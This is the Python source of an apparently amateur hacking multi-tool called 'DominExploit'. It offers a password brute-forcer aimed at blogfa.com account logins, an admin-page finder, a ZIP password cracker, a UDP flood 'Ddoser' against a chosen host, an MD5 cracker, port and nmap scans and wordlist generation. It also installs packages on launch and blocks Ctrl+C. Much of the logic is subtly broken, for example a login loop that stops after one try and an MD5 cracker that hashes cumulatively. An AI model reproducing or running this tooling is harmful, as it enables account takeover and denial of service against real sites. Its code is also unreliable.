"""
Creator : Hosh Masnoei

"""

import os, sys

os.system ("pip install whois")
os.system ("pip install colorama")
os.system ("pip install requests")
os.system ("pip install bs4")
os.system ("pkg install nmap")
os.system ("apt install nmap")
os.system("apt install crunch")

import time
from pyfiglet import Figlet
from requests import post, get
import random
from bs4 import BeautifulSoup
from colorama import Fore, init, Back
from socket import *
import rainbowtext, pyfiglet
import _thread
from time import sleep
import whois
import zipfile
import hashlib
import base64
import signal
import requests

os.system ("clear")

print (Fore.WHITE+"\t  [<<<the run script Domin Exploit]\a")
sleep (1)
__en__ = "\n"
print (__en__)
print(Fore.RED+f"""
⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣾⣷⣷⣶⣄    
⠀⠀⠀⠀⠀⠀⣼⢏⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀   DominExploit         
⠀⠀⠀⠀⠀⠀⣟⣼⠿⠻⣿⣿⠟⠿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢣⣿⠀⣀⡿⣷⡀⢀⣯⠚⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣣⣼⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⡄⠀⠀⢰⣎⢹⣛⢻⡛⣵⡂⠀⠀⠀⢀⣀⡀⠀⠀
⣾⣿⣿⣿⣦⡀⠀⠈⢿⣔⣔⣰⣠⡿⠀⠀⠀⣠⣾⣿⣿⣦⡀     
⠛⠛⠶⢯⣿⣿⣷⣦⣌⡙⠛⠛⠋⣀⣤⣶⣿⣿⣻⣯⠿⠿⠇    
⠀{Fore.MAGENTA}⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⣶⣜⡿⡿⠿⠛⠉⠉⠀⠀⠀⠀⠀
⣠⣀⣄⣀⣄⣤⣴⣾⣿⠾⠝⠿⣿⣷⣦⣄⣀⡀⡀⠀   ⠀⠀⠀
⢿⣿⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠉⠛⠿⣟⣿⣿⣿⣿⣷⠀     
⠀⠀⠙⠓⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⠯⠿⠉    """)

print (Fore.YELLOW+"44 6F 6D 69 6E 45 78 70 6C 6F 69 74 \n")
print (Back.YELLOW+Fore.RED+"\t[*]Old GitHub :  Hosh Masnoei\n\t[*]New GitHub : Hosh Masnoei\033[0m\n")
sleep (0.9)
t = time.localtime(time.time())
localtime = time.asctime(t)
h1 = "Current Time:" + time.asctime(t)
print("\n",h1)
kop = Fore.GREEN+f"""\n[+]DominExploit
{Fore.RED}[+]<<<creator domin exploit : Hosh Masnoei>>>
{Fore.BLUE}[+]<<<script domin exploit the god in hackers...! [×]Telegram : @Sheytan_Virtual>>>
{Fore.RED}[+]<<<[Hosh Masnoei The God]{Fore.BLUE}[created script domin exploit>>>]{Fore.GREEN}[Enter the |||{Fore.WHITE} [1] , [2] , [3] , [4] , [5] , [6] , [7] , [8] , [9] , [10] , [11] , [12] , [13] , [14] , [15] , [16]{Fore.GREEN} |/>]\n"""
for c in kop:
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep(0.05)

print (Fore.WHITE+"\n+ __ __=[domin exploit created 2022 in python]")
print (Fore.WHITE+f"+ __ __=[creator the script domin exploit : {Fore.YELLOW}Hosh Masnoei{Fore.WHITE}]")
print (Fore.WHITE+"+ __ __=[the number 1/16 if number is not found == ERROR]\n")
print (Fore.WHITE+"\n[+]Number :  1/16\n")
sleep (1)
print (Fore.YELLOW+"===============================================================")
print (f"""{Fore.YELLOW}[+]Cracker accont blogfa/> 1     [+]Bug scanner/> 7
{Fore.YELLOW}[+]Cracker login page/> 2        [+]Hasher text [md5]/> 8
{Fore.YELLOW}[+]Cracker File zip or rar/> 3   [+]Hasher text [base64]/> 9
{Fore.YELLOW}[+]Web dos/> 4                   [+]Cracker Hash [md5]/> 10
{Fore.YELLOW}[+]Web whois/> 5                 [+]Decoder Hash [base64]/> 11
[+]Port scanner/> 6              {Fore.YELLOW}[+]IP location/> 12
{Fore.YELLOW}[+]Exit/> 0                      [+]Scann by nmap/> 13
                                 [+]Whois ip by nmap/> 14
                                 [+]Location ip by nmap/> 15
                                 [+]Passlist by crunch/> 16
                                 
                       {Fore.RED}[DominExploit]""")
print (Fore.YELLOW+"===============================================================")
hh = input (Fore.MAGENTA+f"\n{Fore.MAGENTA}[DominExploit] {Fore.YELLOW}||| {Fore.WHITE}msf/> ")
def blogfa():
	__l = rainbowtext.text(pyfiglet.figlet_format("Cracker blogfa"))
	print (__l)
	init()
	login = 'https://blogfa.com/desktop/login.aspx'
	__user_agent__ = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",]
	__users__ = (random.choice(__user_agent__))
	__heder__ = {'Host':'blogfa.com',
'User-Agent': __users__,
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '175',
'Origin': 'https://blogfa.com',
'Connection': 'keep-alive',
'Referer': 'https://blogfa.com/desktop/login.aspx?r=637860193478105692',
'Upgrade-Insecure-Requests': '1',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache'}
	test_log = get(login)
	text_web = (test_log).text
	su = BeautifulSoup(text_web, 'html.parser')
	tet = su.find('input')['value']
	__tar__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit]{Fore.GREEN}||| {Fore.RED}Enter the target url/> ")
	__passfile__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the your pass list/> ")
	sleep (1)
	print (Fore.YELLOW+f"\nyour url blogfa ==> {Fore.CYAN}{__tar__} {Fore.BLUE}if not cracked ==> {Fore.RED}CTRL + C")
	sleep(1)
	print (Fore.RED+f"\nstart your url cracked ! {Fore.YELLOW}==> {Fore.CYAN}{__tar__}\n")
	sleep (1)
	__pass__ = open(__passfile__, "r").read().split()
	for __passw__ in __pass__:
	   	__payload__ = {"_tt":tet,
	   	"usrid":__tar__,
	   	"ups":__passw__,
	   	"btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ",
	   	"proxy":"11.22.33.44:1080"}
	   	__http__ = post('https://blogfa.com/desktop/login.aspx',data=__payload__,headers=__heder__)
	   	rt = (__http__).text
	   	login_text = BeautifulSoup(rt, 'html.parser')
	   	data0 = login_text.find_all('i')
	   	send_data = str(data0)
	   	if "کلمه عبور را اشتباه وارد کرده اید"in send_data:
	   		sleep (0.5)
	   		print (Fore.RED+"[+]"+Fore.RED+"Cracker"+" "+Fore.BLUE+"Blogfa"+" "+Fore.RED+"PASS NOT FOUND : "+Fore.MAGENTA+__passw__+" "+"in "+Fore.MAGENTA+__tar__+"\033[0m")
	   		return "error"
	   	if "کلمه عبور را اشتباه وارد کرده اید"not in send_data:
	   		sleep(0.5)
	   		print (Fore.YELLOW+"[+]Cracker"+" "+Fore.BLUE+"Blogfa"+" "+Fore.YELLOW+"PASS FOUND : "+Fore.MAGENTA+__passw__+Fore.BLUE+" "+"in "+Fore.MAGENTA+__tar__+"\033[0m")
	   		return "ok"
	   		f = open("DominExploit.txt", "a")
	   		f.write(__passw__)
	   		f.close()
	   		sleep (1)
	   		print (Fore.YELLOW+"\n\tpassword saved sdcard <<<DominExploit.txt>>> bye hemi")
	   		break
def login():
	j__ = rainbowtext.text(pyfiglet.figlet_format("cracker login"))
	print (j__)
	__ba__ = Fore.RED+f"""
	[+]{Fore.GREEN}method1 = 1   <www.google.com/admin>
	{Fore.RED}[+]{Fore.GREEN}method2 = 2   <admin/www.google.com\n"""
	print (__ba__)
	try:
		__target__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the method/> ")
		sleep (1)
		__file__ = "/sdcard/login.txt"
		__passfile__ = open(__file__, "r")
		if __target__ == "1":
			__tr__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the url/> ")
			sleep (1)
			print (Fore.YELLOW+f"\nyour login page ==> {Fore.CYAN}{__tr__} {Fore.BLUE}if not cracked ==> {Fore.RED}CTRL + C")
			sleep (1)
			print (Fore.RED+f"\nstart your login page cracked ! {Fore.YELLOW}==> {Fore.CYAN}{__tr__}\n")
			sleep (1)
			for i in __passfile__:
				link = "http://"+__tr__+"/"+i
				re = post(link)
				if re.status_code == 200:
				    print  (Fore.YELLOW+"[+]"+Fore.RED+"Cracker"+" "+Fore.BLUE+"Login"+" "+Fore.WHITE+"LOGIN FOUND : "+Fore.YELLOW+link+"\033[0m")
				else:
					print  (Fore.RED+"[+]Cracker"+" "+Fore.BLUE+"Login"+" "+Fore.WHITE+"LOGIN NOT FOUND : "+Fore.RED+link+"\033[0m")
	except:
		print ("not url or internet")
	if __target__ == "2":
	    _tr = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the url/> ")
	    __file_dir_ = "/sdcard/login.txt"
	    passfile = open(__file_dir_)
	    sleep (1)
	    print (Fore.YELLOW+f"\nyour login page ==> {Fore.CYAN}{_tr} {Fore.BLUE}if not cracked ==> {Fore.RED}CTRL + C")
	    sleep (1)
	    print (Fore.RED+f"\nstart your login page cracked ! {Fore.YELLOW}==> {Fore.CYAN}{_tr}\n")
	    sleep (1)
	    for i in passfile:
	       __link__ = i+"/"+"http://"+_tr
	       __method__ = post(__link__)
	    if __method__.status_code == 200:
	    	print  (Fore.YELLOW+"[+]"+Fore.RED+"Cracker"+" "+Fore.BLUE+"Login"+" "+Fore.WHITE+"LOGIN FOUND : "+Back.YELLOW+Fore.BLACK+__link__+"\033[0m")
	    else:
	    	print  (Fore.RED+"[+]Cracker"+" "+Fore.BLUE+"Login"+" "+Fore.WHITE+"LOGIN NOT FOUND : "+Back.RED+Fore.BLACK+__link__+"\033[0m")
def zip():
	g__ = rainbowtext.text(pyfiglet.figlet_format("zip or rar"))
	print (g__)
	file = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit]{Fore.GREEN} ||| {Fore.RED}Enter the file/> ")
	__passfiles__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit]{Fore.GREEN} ||| {Fore.RED}Enter the pass file/> ")
	sleep (1)
	print (Fore.YELLOW+f"[*]\nyour file zip or rar ==> {Fore.CYAN}{file} {Fore.BLUE}if not cracked ==> {Fore.RED}CTRL + C")
	sleep (1)
	print (Fore.RED+f"\nstart your file cracked ! {Fore.YELLOW}==> {Fore.CYAN}{file}\n")
	sleep (1)
	__f__ = zipfile.ZipFile(file)
	_passwd_ = open(__passfiles__, "r")
	for _passw_ in _passwd_.readlines():
		passw_ = _passw_.strip("\n")
		try:
			__f__.extractall(pwd=passw_)
			sleep (0.5)
			print (Fore.YELLOW+"[+]"+Fore.RED+"Cracker"+" "+Fore.BLUE+"Zip or rar"+" "+Fore.WHITE+"PASS FOUND : "+Fore.YELLOW+_passw_)
			i = open("DominExploit", "a")
			i.write(_passw_)
			i.close()
			break
			print (Fore.YELLOW+"\tlogin page saved sdcard DominExploit.txt bye hemi")
		except:
			sleep (0.5)
			print (Fore.RED+"[+]"+Fore.RED+"Cracker"+" "+Fore.BLUE+"Zip or rar"+" "+Fore.WHITE+"PASS FOUND : "+Fore.RED+_passw_)
def Ddoser():
	__kr__ = rainbowtext.text(pyfiglet.figlet_format("Doser"))
	print (__kr__)
	__site = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the url/> ")
	__threads__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the threads/> ")
	print ("\n")
	__ip__ = gethostbyname(__site)
	__port__ = 80
	msg = "Hosh Masnoei"
	print (f"{Fore.RED}target IP : {Fore.CYAN}", __ip__)
	print (f"{Fore.RED}target PORT : {Fore.CYAN}", __port__)
	sleep(3)
	def ddos(i):
		for i in range(0,99999999):
			s = socket(AF_INET, SOCK_DGRAM)
			s.sendto(bytes(msg,"UTF-8" ), (__ip__, __port__))
			print (Fore.RED+f"[+]Ddoser {Fore.BLUE}DominExploit {Fore.WHITE}Packet sent : {Fore.RED}{__ip__}")
	for i in range(int(__threads__)):
		try:
			_thread.start_new_thread(ddos , ("Thread-"+str(i),))
		except KeyboardInterrupt:
			sys.exit(0)
	while 1:
		pass
def who():
	wh = rainbowtext.text(pyfiglet.figlet_format("Whois"))
	print (wh)
	ws = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}|||  {Fore.RED}Enter the url/> ")
	f = whois.whois(ws)
	print (f)
def scann():
	kk = rainbowtext.text(pyfiglet.figlet_format("Scanner"))
	print (kk)
	h = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the IP/> ")
	p = int(input(f"{Fore.WHITE}[domin{Fore.GREEN}@{Fore.WHITE}exploit] {Fore.GREEN}||| {Fore.RED}Enter the port/> "))
	_s_ = socket(AF_INET, SOCK_STREAM)
	__r = _s_.connect_ex ((h, p))
	if __r == 0:
		print (f"\n{Fore.YELLOW}[+]{Fore.RED}Port Scanner {Fore.BLUE}DominExploit {Fore.WHITE}PORT OPEN : {Fore.YELLOW}{p} {Fore.BLUE}in {Fore.YELLOW}{h}")
	else:
		print (f"\n{Fore.RED}[+]{Fore.RED}Port Scanner {Fore.BLUE}DominExploit {Fore.WHITE}PORT OPEN : {Fore.RED}{p} {Fore.BLUE}in {Fore.RED}{h}")
	_s_.close()
def bug():
	bh = rainbowtext.text(pyfiglet.figlet_format("bug scanner"))
	print (bh)
	b = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target url/> ")
	sleep (1)
	print (Fore.RED+"\n[+]testing SQL in site : "+Fore.CYAN+b)
	sleep (1)
	print (Fore.RED+"\n! Finding SQL bugs.."+Fore.YELLOW+"==> "+Fore.CYAN+b)
	print ("\n")
	sleep (1)
	__re__ = post(b).text
	if "sql" or "mysql" in __re__.read():
		sleep (1)
		print (Fore.YELLOW+f"[*]SQL in site : {Fore.CYAN}{b}")
	elif "You have an error in your SQL syntax" in __re__.read():
		sleep (1)
		print  (Fore.YELLOW+f"[*]SQL in site : {Fore.CYAN}{b}")
	else:
		print  (Fore.RED+f"[*]not SQL in site : {Fore.CYAN}{b}")
def hashm():
	ttt = rainbowtext.text(pyfiglet.figlet_format("md5"))
	print (ttt)
	h1 = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target text/> ")
	sleep (1)
	print (Fore.RED+f"\n[+]Hash text in : {Fore.CYAN}{h1} [md5] {Fore.YELLOW}started !")
	sleep (1)
	print (Fore.RED+f"\n[+]Hash loading text {Fore.YELLOW}==> {Fore.CYAN}{h1}")
	sleep (1)
	s = hashlib.md5(h1.encode("utf-8"))
	print (Fore.RED+"\n[*]text the Hash ==> "+Fore.CYAN+s.hexdigest())
def bas():
	tt = rainbowtext.text(pyfiglet.figlet_format("base64"))
	print (tt)
	f = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target text/> ")
	sleep (1)
	print (Fore.RED+f"\n[+]Hash text in : {Fore.CYAN}{f} [base64] {Fore.YELLOW}started !")
	sleep (1)
	print (Fore.RED+f"\n[+]Hash loading text {Fore.YELLOW}==> {Fore.CYAN}{f}")
	sleep (1)
	h = base64.b64encode(f.encode("utf-8"))
	print  (Fore.RED+f"\n[*]text the Hash ==> {Fore.CYAN}{h}")
def cs():
	l = rainbowtext.text(pyfiglet.figlet_format("cracker hash"))
	print (l)
	h = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target text [hash]/> ")

	m = hashlib.md5()
	__list__ = "1234567890"
	for i in __list__:
		for q in __list__:
			for j in __list__:
				for e in __list__:
					sleep (0.02)
					str = i+q+j+e
					m.update(str.encode("utf-8"))
					outhash = m.hexdigest()
					print (str+" : "+outhash)
					if outhash == h:
						print (Fore.YELLOW+"\n[+]pass FOUND : "+str)
						print ("\033[0m")
						sleep (1)
						print (Fore.RED)
						f = open("DominExploit.txt", "a")
						f.write(str+" : "+outhash)
						f.close()
						sys.exit
def bd():
	ll = rainbowtext.text(pyfiglet.figlet_format("Decoder base64"))
	print (ll)
	h = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target text [Hash]/> ")
	sleep (1)
	print (Fore.RED+f"\n[+]Decoder text in : {Fore.CYAN}{h} [base64] {Fore.YELLOW}started !")
	sleep (1)
	print  (Fore.RED+f"\n[+]Decode loading text {Fore.YELLOW}==> {Fore.CYAN}{h}")
	sleep (1)
	j = base64.b64decode(h)
	print  (Fore.RED+f"\n[*]text the Decoded ==> {Fore.CYAN}{j}")
def go():
	pq = rainbowtext.text(pyfiglet.figlet_format("Location"))
	print (pq)
	__i__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target target IP/> ")
	sleep (1)
	print (Fore.YELLOW+f"\nHacking location target ==> {Fore.CYAN}{__i__}")
	sleep (1)
	print (Fore.RED+f"\nSTARTED hacking location ==> {Fore.CYAN}{__i__}\n")
	sleep (1)
	print (Fore.GREEN)
	__ip__ = __i__
	print ("IP ==> ", __ip__)
	print ("\n")
	__URL__ = "https://get.geojs.io/v1/ip/geo/"+__ip__+ '.json'
	__url__ = __URL__
	geo__ = requests.get(__url__)
	_ge_ = geo__.json()
	print (_ge_)

def np():
	hmi = rainbowtext.text(pyfiglet.figlet_format("Nmap"))
	print (hmi)
	__tars__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target url/> ")
	sleep (1)
	print (Fore.YELLOW+f"\nNmap started ==> {Fore.CYAN}{__tars__}")
	sleep (1)
	__ip__ = gethostbyname(__tars__)
	__cmd__ = "nmap "+__ip__
	os.system(__cmd__)

def np1():
	__hmi__ = rainbowtext.text(pyfiglet.figlet_format("Nmap"))
	print (__hmi__)
	__tarsi__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target url/> ")
	sleep (1)
	print (Fore.YELLOW+f"\nNmap started ==> {Fore.CYAN}{__tarsi__}")
	sleep (1)
	__IP__ = gethostbyname(__tarsi__)
	__pm__ = "nmap --script whois-ip"+__IP__
	os.system(__pm__)

def np2():
	hm = rainbowtext.text(pyfiglet.figlet_format("Nmap"))
	print (hm)
	__TARGET__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the target url/> ")
	sleep (1)
	print (Fore.YELLOW+f"\nNmap started ==> {Fore.CYAN}{__tars__}")
	sleep (1)
	__Ip__ = gethostbyname(__TARGET__)
	__cm__ = "nmap -p 80 --script ip-geolocation"+_Ip__
	os.system (__cm__)

def crh():
	__banner__ = rainbowtext.text(pyfiglet.figlet_format("Passlist"))
	print (__banner__)
	__cd__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the number pass/> ")
	__ch__ = input (f"{Fore.CYAN}[domin{Fore.GREEN}@{Fore.CYAN}exploit] {Fore.GREEN}||| {Fore.RED}Enter the dir file/> ")
	sleep (1)
	print (Fore.GREEN+f"\nstarted create pass list by {Fore.RED}crunch")
	sleep (1)
	print (Fore.CYAN)
	__dir__ = f"crunch 1 {__cd__} 1234567890 -o {__ch__}"
	os.system(__dir__)

try:
	if hh == "1":
		blogfa()
	elif hh == "2":
		login()
	elif hh == "3":
		zip()
	elif hh == "4":
		Ddoser()
	elif hh == "5":
		who()
	elif hh == "6":
		scann()
	elif hh == "0":
		sys.exit()
	elif hh == "7":
		bug()
	elif hh == "8":
		hashm()
	elif hh == "9":
		bas()
	elif hh == "10":
		cs()
	elif hh == "11":
		bd()
	elif hh == "12":
		go()
	elif hh == "13":
		np()
	elif hh == "14":
		np1()
	elif hh == "15":
		np2()
	elif hh == "16":
		crh()
	else:
		def ctrl_handller(signumber, frem):
			print ("you can not kill me")
		print ("\ninstall signal handller")
		print ("done")
	
		signal.signal(signal.SIGINT,ctrl_handller)
		print ("exit? CTRL+Z")
	
		while True:
			pass
except KeyboardInterrupt:
	print ("\nbye !")

# CREATOR SCRIPT (DOMIN EXPLOIT) HOSH MASNOEI